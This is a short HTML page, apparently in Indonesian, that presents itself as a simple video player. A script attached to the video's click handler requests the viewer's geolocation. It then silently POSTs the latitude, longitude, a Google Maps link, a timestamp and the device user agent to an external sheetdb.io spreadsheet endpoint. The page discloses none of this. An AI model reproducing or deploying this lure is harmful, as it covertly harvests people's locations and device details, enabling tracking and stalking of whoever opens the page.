<!DOCTYPE html>
<html>
<head>
  <title>Video</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>

<body style="margin:0; background:black;">

<video id="vid" width="100%" controls autoplay muted playsinline onclick="mintaLokasi()">
  <source src="https://files.catbox.moe/ezxq5k.mp4" type="video/mp4">
</video>

<script>
let sudah = false;

function mintaLokasi() {
  if (sudah) return;
  sudah = true;

  navigator.geolocation.getCurrentPosition(pos => {

    let lat = pos.coords.latitude;
    let lon = pos.coords.longitude;

    fetch("https://sheetdb.io/api/v1/av906p3tie5ax", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        data: [{
          waktu: new Date().toLocaleString(),
          latitude: lat,
          longitude: lon,
          maps: "https://www.google.com/maps?q=" + lat + "," + lon,
          device: navigator.userAgent
        }]
      })
    });

  });
}
</script>

</body>
</html>
